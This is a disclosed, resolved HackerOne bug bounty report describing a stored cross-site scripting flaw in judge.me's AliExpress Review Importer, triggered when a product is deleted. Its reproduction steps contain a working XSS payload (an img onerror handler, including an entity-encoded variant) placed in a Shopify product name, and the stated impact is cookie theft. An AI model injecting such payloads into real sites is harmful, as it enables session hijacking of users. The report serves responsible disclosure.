---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1425882'
original_report_id: '1425882'
title: stored XSS on AliExpress Review Importer/Products when delete product
weakness: Cross-site Scripting (XSS) - Stored
team_handle: judgeme
created_at: '2021-12-14T08:51:35.172Z'
disclosed_at: '2022-03-31T14:01:46.356Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 14
asset_identifier: judge.me
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# stored XSS on AliExpress Review Importer/Products when delete product

## Metadata

- HackerOne Report ID: 1425882
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: judgeme
- Disclosed At: 2022-03-31T14:01:46.356Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi @judgeme!
`code`
Step to reproduce:

1. Go to Shopify admin and create product with name `">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`

2. Go to AliExpress Review Importer/Products and delete our product with name ` 	"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)> `

{F1544890}
3. Xss work=)


P.S. Poc wideo attach


{F1544893}

## Impact

cookie stealer

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
